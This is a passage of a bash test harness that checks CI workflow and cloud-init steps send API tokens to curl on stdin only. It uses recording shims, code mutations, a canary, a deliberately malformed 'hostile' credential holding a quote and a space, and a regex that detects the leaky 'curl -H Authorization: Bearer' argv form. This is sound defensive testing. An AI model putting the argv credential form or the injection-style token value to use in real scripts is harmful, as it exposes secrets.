if [[ -z "$S5_ORDER_BAD" && "$S5_BCN" -ge "$S5_BC_FLOOR" && "$S5_STEPS_WITH_BC" == "$S5_STEPS_WANT" ]]; then row "S5 Guard 1 order: in each of the five steps the library is sourced before its first call ($S5_BCN bc_curl statements, $S5_STEPS_WITH_BC steps derived from the workflow; anti-vacuity floor $S5_BC_FLOOR)" ok
else row "S5 Guard 1 order: a step calls the library before sourcing it, or the derived population is empty or unjudged" fail "bad='${S5_ORDER_BAD# }' statements=$S5_BCN steps=$S5_STEPS_WITH_BC floor=$S5_BC_FLOOR"; fi
# Mutation 3 (reorder): move the `source` line below the first call in one step; the order predicate must judge it RED.
python3 -I -c 'import sys, re
t = open(sys.argv[1]).read().split("\n")
code = lambda l: not l.lstrip().startswith("#")
i = next(k for k, l in enumerate(t) if code(l) and re.search(r"source .*scripts/lib/bearer-curl\.sh", l))
line = t.pop(i)
j = next(k for k, l in enumerate(t) if code(l) and re.search(r"bc_curl [a-z]", l))
t.insert(j + 1, line)
open(sys.argv[2], "w").write("\n".join(t))' "$S5_B_HB1" "$S4/b-s5-reorder.sh" || fatal "S5 could not build the reorder mutant"
if ! cmp -s "$S5_B_HB1" "$S4/b-s5-reorder.sh" && s5_order_ok "$S5_B_HB1" && ! s5_order_ok "$S4/b-s5-reorder.sh"; then row "S5 Guard 1 mutation 3: a heartbeat step whose source line is moved below its first call is judged RED by the order predicate (the unmutated step is green)" ok
else row "S5 Guard 1 mutation 3: the order predicate is blind to a reordered step" fail "landed=$(cmp -s "$S5_B_HB1" "$S4/b-s5-reorder.sh" && echo no || echo yes)"; fi

# ---- baseline E and the ceiling table: SET IDENTITY with the rows still owned by tracked work (parametrized on the registry commit) ----
S5_CEIL="scripts/fixtures/shell-trace-refusal/rule-e-census-ceiling.tsv"
S5_REG_OFFENDS=0; S5_REG_LINT="$(python3 scripts/lint-shell-trace-credential-refusal.py "$S5_REG" 2>&1)"; grep -q '^OK:' <<<"$S5_REG_LINT" || S5_REG_OFFENDS=1
S5_WANT_ROWS="$( (( S5_REG_OFFENDS )) && printf '%s\n' "$S5_REG"; true)"
S5_WANT_ROWS="$(sort <<<"$S5_WANT_ROWS")"
S5_GOT_BASE="$( { grep -v '^#' "$BASE_E" || true; } | cut -f1 | sort)"; S5_GOT_CEIL="$( { grep -v '^#' "$S5_CEIL" || true; } | cut -f1 | sort)"
if [[ "$S5_GOT_BASE" == "$S5_WANT_ROWS" && "$S5_GOT_CEIL" == "$S5_WANT_ROWS" ]]; then row "S5 Guard 1: baseline E and the census ceiling each hold exactly the rows still owned by tracked work ($( (( S5_REG_OFFENDS )) && echo 'the registry file, which still carries its argv form' || echo 'none: every Rule E site is converted'))" ok
else row "S5 Guard 1: baseline E or the ceiling table differs from the rows still owned by tracked work" fail "want='${S5_WANT_ROWS//$'\n'/,}' base='${S5_GOT_BASE//$'\n'/,}' ceil='${S5_GOT_CEIL//$'\n'/,}'"; fi
S5_OWN_BASE='# OWNERS (S5, #9597): a row in this file must carry its own owner'
S5_OWN_CEIL='# OWNERS (S5, #9597): a row in this table carries its own owner'
if grep -qF -- "$S5_OWN_BASE" "$BASE_E" && grep -qF -- "$S5_OWN_CEIL" "$S5_CEIL" && grep -qF -- "${S5_OWN_BASE#\# }" scripts/lint-shell-trace-credential-refusal.py \
   && ! grep -qF '#9756' < <(sed -n '1,/^[^#]/p' "$BASE_E"); then row "S5 Guard 1: the headers of baseline E and of the ceiling table state the owner-line rule in state-neutral words (no row is named), and the lint's writer emits the baseline's text" ok
else row "S5 Guard 1: the baseline or the ceiling table header does not state the owner-line rule, or still names a converted row's owner" fail "owner-line header text missing or stale"; fi

# ---- Guard 2: the heartbeat reads (three steps, non-gating) ----
s5_hb_valid_ok() { # <token>: rc 0 when the valid-credential contract holds for the row just run
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 ]] && s4_calls_ok 1 \
    && [[ "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $1\"" ]] \
    && s4_nowhere_on_argv "$1" && grep -qF -- '**up**' "$S4_ROW/summary" && s5_canary_clean \
    && [[ "$(grep -cxF -- "::add-mask::$1" "$S4_ROW/stdout")" == 1 ]]   # the runner is told to mask THIS token, once
}
s5_hb_refused_ok() { # rc 0 when a refused credential made no request, printed ONE visible marker and left the step green and "unavailable"
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 1 ]] \
    && s4_said 'SOLEUR_CREDENTIAL_REFUSED script=apply-web-platform-infra reason=token_shape' && s4_said 'bc_curl: TOKEN unusable' \
    && grep -qF -- 'unavailable' "$S4_ROW/summary" && ! grep -qF -- '**up**' "$S4_ROW/summary" && s5_canary_clean
}
s5_hb_unset_ok() { # an unset or empty credential: the existing arm (no request, no marker), same verdict
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 0 ]] && grep -qF -- 'unavailable' "$S4_ROW/summary"
}
S5_HBN=0
for hb in "$S5_B_HB1" "$S5_B_HB2" "$S5_B_HB3"; do
  S5_HBN=$((S5_HBN + 1)); n="hb$S5_HBN"
  s5_run "s5-$n-hz-shape" "$hb" "$S4/real" D_BETTERSTACK_API_TOKEN="$S5_HZ" SHIM_BODY="$S5_HB_JSON"
  if s5_hb_valid_ok "$S5_HZ"; then row "S5 Guard 2 ($n): a 64-character alphanumeric credential is sent once, on curl's stdin config and on no argv, and the step summary reads the heartbeat status" ok
  else row "S5 Guard 2 ($n): a valid credential is not sent on stdin only, or the status is not read" fail "rc=$S4_RC calls=$(s4_ncalls) stdin='$(s4_stdin_line 1 1 | cut -c1-24)...'"; fi
  s5_run "s5-$n-bs-shape" "$hb" "$S4/real" D_BETTERSTACK_API_TOKEN="$S5_BS" SHIM_BODY="$S5_HB_JSON"
  if s5_hb_valid_ok "$S5_BS"; then row "S5 Guard 2 ($n): a Better Stack-shaped credential holding an underscore and hyphens is accepted (the guard's alphabet matches what the vendor issues)" ok
  else row "S5 Guard 2 ($n): a realistic Better Stack credential is refused or mis-sent" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
  s5_run "s5-$n-hostile" "$hb" "$S4/real" D_BETTERSTACK_API_TOKEN="$S5_BAD" SHIM_BODY="$S5_HB_JSON"; S5_REFUSALS=$((S5_REFUSALS + 1))
  if s5_hb_refused_ok; then row "S5 Guard 2 ($n): a credential holding a quote and a space makes no request, prints one visible refusal marker and leaves the non-gating step green and \"unavailable\" (the old failure class)" ok
  else row "S5 Guard 2 ($n): a refused credential does not land in the old verdict class" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
  s5_run "s5-$n-unset" "$hb" "$S4/real"; S5_REFUSALS=$((S5_REFUSALS + 1))
  if s5_hb_unset_ok && s5_canary_clean; then row "S5 Guard 2 ($n): a credential that cannot be read (doppler fails) keeps the existing arm: no request, no marker, \"unavailable\"" ok
  else row "S5 Guard 2 ($n): an unreadable credential changed verdict" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
done
# Harness row (a): a recording curl that ignores `--config -` is judged RED by the same predicate (the harness cannot be satisfied by a blind shim).
s5_run s5-hb1-blind "$S5_B_HB1" "$S4/real" D_BETTERSTACK_API_TOKEN="$S5_HZ" SHIM_BODY="$S5_HB_JSON" SHIM_NOSTDIN=1
if [[ "$(s4_ncalls)" == 1 ]] && ! s5_hb_valid_ok "$S5_HZ"; then row "S5 harness: a curl that never reads --config - is judged RED by the heartbeat contract (the predicate is not satisfiable by a blind shim)" ok
else row "S5 harness: a blind curl satisfied the heartbeat contract" fail "calls=$(s4_ncalls)"; fi
# Mutation 1 (Guard 1): the argv header restored in a heartbeat step goes RED on the nowhere-on-argv clause.
s5_job_body registry_host_replace "Best-effort heartbeat status" "$S4/b-s5-mut-argv.sh" \
  "bc_curl apply-web-platform-infra 'Authorization:Bearer :TOKEN' -- " 'curl -H "Authorization: Bearer ${TOKEN}" '
s5_run s5-mut-argv "$S4/b-s5-mut-argv.sh" "$S4/real" D_BETTERSTACK_API_TOKEN="$S5_HZ" SHIM_BODY="$S5_HB_JSON"
if ! s5_hb_valid_ok "$S5_HZ" && s4_argv_has "$S5_HZ"; then row "S5 Guard 1 mutation 1: a heartbeat step that puts the header back on curl's argument list is judged RED (token on a recorded argv)" ok
else row "S5 Guard 1 mutation 1: an argv credential header in a heartbeat step is not caught" fail "argv=$(s4_argv_has "$S5_HZ" && echo seen || echo missed)"; fi
# Mutation 6 (Guard 2): silencing a converted call hides the marker; the marker-visible clause must go RED.
s5_job_body registry_host_replace "Best-effort heartbeat status" "$S4/b-s5-mut-silent.sh" \
  'https://uptime.betterstack.com/api/v2/heartbeats)' 'https://uptime.betterstack.com/api/v2/heartbeats 2>/dev/null)'
s5_run s5-mut-silent "$S4/b-s5-mut-silent.sh" "$S4/real" D_BETTERSTACK_API_TOKEN="$S5_BAD" SHIM_BODY="$S5_HB_JSON"; S5_REFUSALS=$((S5_REFUSALS + 1))
if [[ "$(s4_ncalls)" == 0 ]] && ! s5_hb_refused_ok; then row "S5 Guard 2 mutation 6: a converted call silenced with 2>/dev/null is judged RED by the marker-visible clause (the refusal marker never appears)" ok
else row "S5 Guard 2 mutation 6: a silenced converted call is not caught" fail "markers=$(s4_markers) calls=$(s4_ncalls)"; fi

# ---- Guard 2: the gating volume-existence probe (two curls, one step) ----
s5_pst_run() { s5_run "$1" "$2" "$S4/real" EXPECTED_VOLUME_ID=4242 "${@:3}"; }
s5_pst_valid_ok() { # <expected probe_result>
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 2 ]] && s4_calls_ok 1 && s4_gho_has "probe_result=$1" \
    && [[ "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $S5_HZ\"" && "$(s4_stdin_line 2 1)" == "header = \"Authorization: Bearer $S5_HZ\"" ]] \
    && s4_nowhere_on_argv "$S5_HZ" && s5_canary_clean \
    && [[ "$(grep -cxF -- "::add-mask::$S5_HZ" "$S4_ROW/stdout")" == 1 ]]
}
s5_pst_refused_ok() { # a refused credential: no request, a visible marker per call, the step green, and the result is NEVER `absent`
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 2 ]] && s4_gho_has 'probe_result=unknown-000' && ! s4_gho_has 'probe_result=absent' \
    && s4_said 'SOLEUR_CREDENTIAL_REFUSED script=apply-web-platform-infra reason=token_shape' && s5_canary_clean
}
s5_pst_run s5-pst-present "$S5_B_PST" HCLOUD_TOKEN="$S5_HZ" SHIM_CODE=200 SHIM_BODY='{"volumes":[{"id":4242}]}'
if s5_pst_valid_ok present; then row "S5 Guard 2 (posture): a pinned volume that exists reads \`present\`; both probes send the credential on stdin only and on no argv" ok
else row "S5 Guard 2 (posture): the existing-volume probe changed verdict or leaks the credential" fail "rc=$S4_RC calls=$(s4_ncalls) gho=$(tr '\n' ' ' < "$S4_ROW/gho")"; fi
s5_pst_run s5-pst-absent "$S5_B_PST" HCLOUD_TOKEN="$S5_HZ" SHIM_CODE=404 SHIM_BODY='{"volumes":[]}'
if s5_pst_valid_ok absent; then row "S5 Guard 2 (posture): a 404 on the pinned id with no volume of that name reads \`absent\` (both signals agree)" ok
else row "S5 Guard 2 (posture): the absent verdict changed" fail "rc=$S4_RC calls=$(s4_ncalls) gho=$(tr '\n' ' ' < "$S4_ROW/gho")"; fi
s5_pst_run s5-pst-wrongid "$S5_B_PST" HCLOUD_TOKEN="$S5_HZ" SHIM_CODE=404 SHIM_BODY='{"volumes":[{"id":1}]}'
if [[ "$S4_RC" == 1 ]] && s4_said 'the pinned volume id 4242 returned 404, but a volume named soleur-registry-store still exists'; then row "S5 Guard 2 (posture): a 404 on the pinned id while a volume of that name exists still aborts (the mistyped-id guard is unchanged)" ok
else row "S5 Guard 2 (posture): the mistyped-id abort changed" fail "rc=$S4_RC"; fi
s5_pst_run s5-pst-bs "$S5_B_PST" HCLOUD_TOKEN="$S5_BS" SHIM_CODE=200 SHIM_BODY='{"volumes":[{"id":4242}]}'
[[ "$S4_RC" == 0 && "$(s4_ncalls)" == 2 ]] && row "S5 Guard 2 (posture): a credential holding an underscore and hyphens is accepted by the guard (realistic shape)" ok || row "S5 Guard 2 (posture): a realistic credential shape was refused" fail "rc=$S4_RC calls=$(s4_ncalls)"
# A stub that would answer 404 with an empty name list (the shape that reads `absent`) is never reached by a refused credential.
s5_pst_run s5-pst-hostile "$S5_B_PST" HCLOUD_TOKEN="$S5_BAD" SHIM_CODE=404 SHIM_BODY='{"volumes":[]}'; S5_REFUSALS=$((S5_REFUSALS + 1))
if s5_pst_refused_ok; then row "S5 Guard 2 (posture): a refused credential makes no request, prints a visible marker per call and reads \`unknown-000\`, never \`absent\` (a refusal cannot manufacture the verdict that admits a bare create)" ok
else row "S5 Guard 2 (posture): a refused credential reaches a verdict other than unknown-000" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers) gho=$(tr '\n' ' ' < "$S4_ROW/gho")"; fi
s5_pst_run s5-pst-empty "$S5_B_PST" HCLOUD_TOKEN=; S5_REFUSALS=$((S5_REFUSALS + 1))
if [[ "$S4_RC" == 1 && "$(s4_ncalls)" == 0 ]] && s4_said 'cannot read HCLOUD_TOKEN from Doppler'; then row "S5 Guard 2 (posture): an empty credential keeps the existing fail-closed abort (no request)" ok
else row "S5 Guard 2 (posture): the unreadable-credential abort changed" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
# Mutation 1 (Guard 2): fold a refusal into the verdict that admits a create. Both folds are applied (a transport failure to 404 and an
# unreadable count to 0), so the refused run reaches `absent`; the refused-verdict clause must go RED.
s5_job_body registry_pull_path_gate "Resolve recovery posture" "$S4/b-s5-mut-absent.sh" \
  '|| PROBE_STATUS="000"' '|| PROBE_STATUS="404"' 'NAME_COUNT="unknown"' 'NAME_COUNT="0"'
s5_pst_run s5-pst-mut-absent "$S4/b-s5-mut-absent.sh" HCLOUD_TOKEN="$S5_BAD" SHIM_CODE=404 SHIM_BODY='{"volumes":[]}'; S5_REFUSALS=$((S5_REFUSALS + 1))
if ! s5_pst_refused_ok; then row "S5 Guard 2 mutation 1: a posture step that maps a refusal to a 404 and an unreadable count to zero is judged RED by the refused-verdict clause" ok
else row "S5 Guard 2 mutation 1: a refusal folded into \`absent\` is not caught" fail "gho=$(tr '\n' ' ' < "$S4_ROW/gho")"; fi
# ---- review-round rows (workflow side): mask before the call, library-absent behaviour, an unreadable name count, owners ----
# The ::add-mask:: line must precede the first call in every step (the canary filter above ignores add-mask lines, so only an ORDER row can pin it).
s5_mask_ok() { # <body file> -> rc 0 when a non-comment ::add-mask:: line precedes the first bc_curl call
  local t m c
  t="$(grep -vn '^[[:space:]]*#' "$1" || true)"
  m="$(grep -m1 'add-mask' <<<"$t" | cut -d: -f1)"
  c="$(grep -m1 'bc_curl [a-z]' <<<"$t" | cut -d: -f1)"
  [[ -n "$m" && -n "$c" && "$m" -lt "$c" ]]
}
S5_MASK_BAD=""
for b in "$S5_B_HB1" "$S5_B_HB2" "$S5_B_HB3" "$S5_B_PST" "$S5_B_EMP"; do s5_mask_ok "$b" || S5_MASK_BAD+=" ${b##*/}"; done
grep -v 'add-mask' "$S5_B_HB1" > "$S4/b-s5-nomask.sh" || true
if [[ -z "$S5_MASK_BAD" ]] && ! s5_mask_ok "$S4/b-s5-nomask.sh"; then row "S5 Guard 1 order: every converted step masks its token before its first call, and a step with the mask line deleted is judged RED" ok
else row "S5 Guard 1 order: a converted step does not mask its token before the call, or the mask predicate is blind" fail "bad='${S5_MASK_BAD# }'"; fi
s5_run s5-hb1-nomask "$S4/b-s5-nomask.sh" "$S4/real" D_BETTERSTACK_API_TOKEN="$S5_HZ" SHIM_BODY="$S5_HB_JSON"
if ! s5_hb_valid_ok "$S5_HZ"; then row "S5 Guard 2 mutation: a heartbeat step with the ::add-mask:: line deleted is judged RED by the valid-credential row (the runner must be told to mask this token, once)" ok
else row "S5 Guard 2 mutation: a deleted ::add-mask:: line is not caught by the executed row" fail "rc=$S4_RC"; fi
# Library absent (an empty workspace): the heartbeat reads skip and stay green and "unavailable"; the gating posture step aborts. Neither falls back to argv.
S5_NOLIB_BAD=""; n=0
for hb in "$S5_B_HB1" "$S5_B_HB2" "$S5_B_HB3"; do
  n=$((n + 1))
  s5_run "s5-hb$n-nolib" "$hb" "$S4/real" D_BETTERSTACK_API_TOKEN="$S5_HZ" SHIM_BODY="$S5_HB_JSON" GITHUB_WORKSPACE="$S4_EMPTYWS"
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 0 ]] && grep -qF -- 'unavailable' "$S4_ROW/summary" && s4_said 'could not be loaded' || S5_NOLIB_BAD+=" hb$n"
done
s5_pst_run s5-pst-nolib "$S5_B_PST" HCLOUD_TOKEN="$S5_HZ" GITHUB_WORKSPACE="$S4_EMPTYWS" SHIM_CODE=200 SHIM_BODY='{"volumes":[{"id":4242}]}'
[[ "$S4_RC" == 1 && "$(s4_ncalls)" == 0 ]] && s4_said 'could not be loaded' || S5_NOLIB_BAD+=" posture"
if [[ -z "$S5_NOLIB_BAD" ]]; then row "S5 Guard 2: with the library absent the three heartbeat reads make no request and stay green and \"unavailable\", and the posture step aborts with no request (no argv fallback)" ok
else row "S5 Guard 2: a converted step behaves wrongly with the library absent" fail "bad='${S5_NOLIB_BAD# }'"; fi
s5_job_body registry_pull_path_gate "Resolve recovery posture" "$S4/b-s5-mut-nolib.sh" 'an unsent probe is not evidence of absence."; exit 1; }' 'an unsent probe is not evidence of absence."; }'
s5_pst_run s5-pst-mut-nolib "$S4/b-s5-mut-nolib.sh" HCLOUD_TOKEN="$S5_HZ" GITHUB_WORKSPACE="$S4_EMPTYWS" SHIM_CODE=200 SHIM_BODY='{"volumes":[{"id":4242}]}'
if [[ "$S4_RC" != 1 ]]; then row "S5 Guard 2 mutation: a posture step whose missing-library arm no longer exits is judged RED by the library-absent row" ok
else row "S5 Guard 2 mutation: dropping the exit of the posture step's missing-library arm is not caught" fail "rc=$S4_RC"; fi
# An unreadable name count must read UNKNOWN, never zero: a 404 on the pinned id with a body the count cannot parse still aborts (it never reads `absent`).
S5_NJ_BAD=""
for nb in 'not-json' '{"error":{"code":"rate_limit_exceeded"}}' '{"volumes":null}' '[]'; do
  s5_pst_run s5-pst-nj "$S5_B_PST" HCLOUD_TOKEN="$S5_HZ" SHIM_CODE=404 SHIM_BODY="$nb"
  [[ "$S4_RC" == 1 ]] && ! s4_gho_has 'probe_result=absent' && s4_said 'name_count=unknown' || S5_NJ_BAD+=" $nb"
done
S5_NJ_OK=0; [[ -z "$S5_NJ_BAD" ]] && S5_NJ_OK=1
s5_job_body registry_pull_path_gate "Resolve recovery posture" "$S4/b-s5-mut-count.sh" 'NAME_COUNT="unknown"' 'NAME_COUNT="0"'
s5_pst_run s5-pst-mut-count "$S4/b-s5-mut-count.sh" HCLOUD_TOKEN="$S5_HZ" SHIM_CODE=404 SHIM_BODY='not-json'
s5_job_body registry_pull_path_gate "Resolve recovery posture" "$S4/b-s5-mut-else.sh" 'else "unknown" end' 'else 0 end'
s5_pst_run s5-pst-mut-else "$S4/b-s5-mut-else.sh" HCLOUD_TOKEN="$S5_HZ" SHIM_CODE=404 SHIM_BODY='{"volumes":null}'
if [[ "$S4_RC" == 0 ]] && s4_gho_has 'probe_result=absent'; then row "S5 Guard 2 mutation (posture): a name lookup whose JSON has no volumes array (an error envelope, null) read as zero admits \`absent\` and is judged RED by the error-envelope rows" ok
else row "S5 Guard 2 mutation (posture): an error-envelope name lookup read as zero is not caught" fail "rc=$S4_RC"; fi
if [[ "$S5_NJ_OK" == 1 && "$S4_RC" == 0 ]]; then row "S5 Guard 2 (posture): a 404 on the pinned id with an unparseable, error-envelope, null or array-shaped name lookup aborts as unknown (never absent)" ok
else row "S5 Guard 2 (posture): an unreadable name count is not held at unknown" fail "bad='${S5_NJ_BAD# }'"; fi
s5_pst_run s5-pst-mut-count2 "$S4/b-s5-mut-count.sh" HCLOUD_TOKEN="$S5_HZ" SHIM_CODE=404 SHIM_BODY='not-json'
if [[ "$S4_RC" == 0 ]] && s4_gho_has 'probe_result=absent'; then row "S5 Guard 2 mutation (posture): folding the unreadable count to zero reaches \`absent\` and is judged RED" ok
else row "S5 Guard 2 mutation (posture): the fold of an unreadable count to zero is not caught" fail "rc=$S4_RC"; fi
# Owners: every baseline row carries an owner line (a `#N` comment) directly above it (the two cla-evidence rows were the one exemption; they left
# with #9756 and so did the carve-out), and the header's OWNERS lines are the same text the writer emits (so the committed header cannot drift
# from `--write-baseline-e`).
s5_owner_bad() { # <baseline file> -> prints the paths of rows with no `#N` owner comment directly above
  local line prev="" p bad=""
  while IFS= read -r line; do
    case "$line" in
      '#'*) prev="$line" ;;
      '') prev="" ;;
      *) p="${line%%$'\t'*}"
         [[ "$prev" =~ \#[0-9]+ ]] || bad+=" $p"
         prev="" ;;
    esac
  done < "$1"
  printf '%s' "${bad# }"
}
printf '# header\napps/web-platform/infra/x.yml\t1\n' > "$S4/own-bad.txt"
printf '# header\n# #9757 owner of the row below\napps/web-platform/infra/x.yml\t1\n' > "$S4/own-ok.txt"
printf '# header\napps/cla-evidence/scripts/x.sh\t1\n' > "$S4/own-bad-cla.txt"
printf '# header\n# #9757 owner of the row below\napps/cla-evidence/scripts/x.sh\t1\n' > "$S4/own-ok-cla.txt"
S5_OWNER_BAD="$(s5_owner_bad "$REPO_ROOT/$BASE_E")"
S5_OWNER_CTL=0; [[ "$(s5_owner_bad "$S4/own-bad.txt")" == apps/web-platform/infra/x.yml && -z "$(s5_owner_bad "$S4/own-ok.txt")" \
  && "$(s5_owner_bad "$S4/own-bad-cla.txt")" == apps/cla-evidence/scripts/x.sh && -z "$(s5_owner_bad "$S4/own-ok-cla.txt")" ]] && S5_OWNER_CTL=1
S5_HDR_BAD="$(python3 -I -c '
import sys
base = open(sys.argv[1]).read().split("\n")
src = open(sys.argv[2]).read()
i = next((k for k, l in enumerate(base) if l.startswith("# OWNERS")), None)
if i is None:
    print("anchor-missing"); sys.exit(0)
bad = []
while i < len(base) and base[i].startswith("#"):
    txt = base[i][2:]
    if txt not in src: bad.append(txt[:40])
    i += 1
print(";".join(bad))' "$REPO_ROOT/$BASE_E" "$REPO_ROOT/scripts/lint-shell-trace-credential-refusal.py")"
if [[ -z "$S5_OWNER_BAD" && -z "$S5_HDR_BAD" && "$S5_OWNER_CTL" == 1 ]]; then row "S5 Guard 1: every baseline E row carries an owner line above it (a cla-evidence row without one is refused, with one is accepted), and the header's OWNERS text is the text the lint's writer emits" ok
else row "S5 Guard 1: a baseline E row has no owner, or the header drifted from the writer" fail "unowned='${S5_OWNER_BAD# }' header-drift='$S5_HDR_BAD' owner-control=$S5_OWNER_CTL"; fi
# The operator hints that used to print the argv `curl -H "Authorization: Bearer ..."` form (echo text and the comment above the id pin) stay off argv: Rule E does not read echo text.
S5_HINT_RE="(-H|--header)[ =]*\\\\*[\"']?authorization:? *bearer"
S5_HINT_CTL="$(printf '%s\n' 'x curl -s -H \"Authorization: Bearer y\"' "x curl -H 'Authorization: Bearer y'" 'x curl --header "Authorization: Bearer y"' 'x curl -H "authorization:bearer y"' | grep -ciE -- "$S5_HINT_RE" || true)"
S5_HINTS="$(grep -ciE -- "$S5_HINT_RE" "$REPO_ROOT/$S5_WF" || true)"
if [[ "$S5_HINT_CTL" == 4 && "$S5_HINTS" == 0 ]]; then row "S5 Guard 1: no operator hint or comment in the apply workflow tells the operator to put the token on a curl argument list (the pattern fires on a planted positive)" ok
else row "S5 Guard 1: the apply workflow still prints the argv curl form to the operator" fail "hints=$S5_HINTS control=$S5_HINT_CTL"; fi
S5_REFUSAL_FLOOR=6
if [[ "$S5_CANARY_RUNS" -ge "$S5_REFUSAL_FLOOR" ]]; then row "S5 negative canary: $S5_CANARY_RUNS runs planted the canary and had every captured stream searched for it (anti-vacuity floor $S5_REFUSAL_FLOOR)" ok
else row "S5 negative canary: the planted-canary run population is below its anti-vacuity floor" fail "runs=$S5_CANARY_RUNS floor=$S5_REFUSAL_FLOOR"; fi

# ---- S5 registry rows (the registry commit): the four Better Stack posting scripts of `cloud-init-registry.yml` ----
# The host has no checkout and a user_data budget, so each script carries the inline form of the library: a judge (`_bs_ok`, the
# library's alphabet) before any request, the bearer on curl's stdin config through a PER-COMMAND redirect, and a refusal that prints
# the value-free marker and takes the not-shipped branch. Population and verdicts are DERIVED from the template; the committed bytes of
# each posting region are EXECUTED (rendered the way templatefile() does: TF variables substituted, `$${` and `%%{` unescaped).
S5_REF_BASE="$S5_CANARY_RUNS"
S5R="$S4/s5reg"; assert_fixture_dir "$S5R"; mkdir -p "$S5R/shim"
cp "$S4/shim/curl" "$S4/shim/sleep" "$S5R/shim/"
printf '#!%s\nprintf "soleur-registry\\n"\n' "$BASH_BIN" > "$S5R/shim/hostname"
# `doppler run ... -- CMD...` runs CMD with the environment the harness set (the real wrapper injects the token from the isolated config).
cat > "$S5R/shim/doppler" <<'S5DOP'
#!/usr/bin/env bash
while [[ $# -gt 0 && "$1" != -- ]]; do shift; done
shift
exec "$@"
S5DOP
sed -i "1s|.*|#!${BASH_BIN}|" "$S5R/shim/doppler"; chmod +x "$S5R/shim/curl" "$S5R/shim/sleep" "$S5R/shim/hostname" "$S5R/shim/doppler"
S5_URL="https://s5-ingest.example.invalid/"
s5_reg_py='
import sys, re, yaml
yml, kind, out = sys.argv[1], sys.argv[2], sys.argv[3]
edits = sys.argv[4:]
d = yaml.safe_load(open(yml))
URL = "https://s5-ingest.example.invalid/"
TOK = "TOKEN=\"$${BETTERSTACK_LOGS_TOKEN:-}\""
def wf(path):
    for f in d["write_files"]:
        if f.get("path") == path: return f["content"]
    sys.exit(3)
def render(t):
    t = t.replace("${betterstack_ingest_url}", URL)
    t = re.sub(r"(?<!\$)\$\{[a-z_][a-z0-9_]*\}", "stub", t)
    return t.replace("$${", "${").replace("%%{", "%{")
def region(c, start_pred, end_pred):
    L = c.split("\n")
    i = next(k for k, l in enumerate(L) if start_pred(l))
    j = next(k for k in range(i + 1, len(L)) if end_pred(L[k], L[i]))
    return "\n".join(L[i:j + 1]) + "\n"
ind = lambda l: len(l) - len(l.lstrip())
if kind == "hb":
    c = wf("/usr/local/bin/zot-disk-heartbeat.sh"); L = c.split("\n")
    i = next(k for k, l in enumerate(L) if l.strip() == TOK)
    raw = "\n".join(L[i:]) + "\n"
elif kind == "nic":
    raw = region(wf("/usr/local/bin/soleur-private-nic-guard.sh"), lambda l: l.strip() == TOK, lambda l, s: l.strip() == "fi" and ind(l) == ind(s))
elif kind == "ship":
    c = wf("/usr/local/bin/zot-log-shipper.sh")
    # the judge block ends at the first `fi` AFTER the line that drops the token
    L = c.split("\n"); i = next(k for k, l in enumerate(L) if l.strip() == TOK)
    j = next(k for k in range(i, len(L)) if "TOKEN_REFUSED=1; TOKEN=" in L[k]); e = next(k for k in range(j, len(L)) if L[k].strip() == "fi")
    a = "\n".join(L[i:e + 1]) + "\n"
    s = next(k for k, l in enumerate(L) if l.strip() == "post_body() {"); t = next(k for k in range(s, len(L)) if "CREDENTIAL BACKSTOP" in L[k])
    raw = a + "\n".join(L[s:t]) + "\n"
elif kind == "boot":
    raw = next(r for r in d["runcmd"] if isinstance(r, str) and "ZLSBOOTEOF" in r)
else:
    sys.exit(4)
for k in range(0, len(edits), 2):
    if edits[k] not in raw: sys.exit(5)
    raw = raw.replace(edits[k], edits[k + 1])
open(out + ".raw", "w").write(raw)
open(out, "w").write(render(raw))
'
# s5_reg_body <kind> <out> [<from> <to>]...: the rendered region (an edit that does not land is FATAL: it would report the baseline)
s5_reg_body_try() { local kind="$1" out="$2"; shift 2; assert_fixture_dir "$out"; python3 -I -c "$s5_reg_py" "$REPO_ROOT/$S5_REG" "$kind" "$out" "$@"; }
s5_reg_body() { s5_reg_body_try "$@" || fatal "S5 could not build the registry region '$1' (it could not be extracted or an edit did not land)"; }
# The runner for a rendered region: the harness prefix, then the region. `set -u` and the LINE a script has built by then.
s5_reg_prefix() { # <kind> -> prints the lines that precede the region
  case "$1" in
    hb|nic) printf 'set -u\nLINE=%s\n' "'SOLEUR_FIXTURE_ROW x=1'" ;;
    ship) printf 'set -u\n' ;;
    boot) : ;;
  esac
}
s5_reg_suffix() { # <kind> -> prints the lines that follow the region
  case "$1" in
    ship) printf 'for i in 1 2 3; do ship "row$i" && r=0 || r=$?; echo "ship$i rc=$r"; done\n' ;;
    *) : ;;
  esac
}
s5_reg_make() { # <kind> <rendered region> <out>: the runnable body
  { s5_reg_prefix "$1"; cat "$2"; s5_reg_suffix "$1"; } > "$3"
}
S5R_N=0
s5_reg_exec() { # <label> <kind> <rendered> [NAME=value ...]: run the region under the recording curl
  local label="$1" kind="$2" rend="$3"; shift 3
  S5R_N=$((S5R_N + 1)); local b="$S5R/run-$S5R_N.sh"; assert_fixture_dir "$b"
  s5_reg_make "$kind" "$rend" "$b"
  local sv="$S4_SHIM"; S4_SHIM="$S5R/shim"
  s5_run "s5r-$label" "$b" "$S4/real" "$@"
  S4_SHIM="$sv"
}
s5_reg_ok() { # the valid-credential contract for one posting script: <token> <calls>
  [[ "$S4_RC" == 0 && "$(s4_ncalls)" == "$2" ]] && s4_calls_ok 1 && [[ "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $1\"" ]] \
    && s4_nowhere_on_argv "$1" && s4_argv_has "$S5_URL" && s4_argv_has 'Content-Type: application/json' && [[ "$(s4_markers)" == 0 ]] && s5_canary_clean
}
s5_reg_refused_ok() { # a refused token: no request, ONE marker naming the script, the not-shipped branch and never the egress-FAILED branch
  # <script name> <reason> <not-shipped fragment>
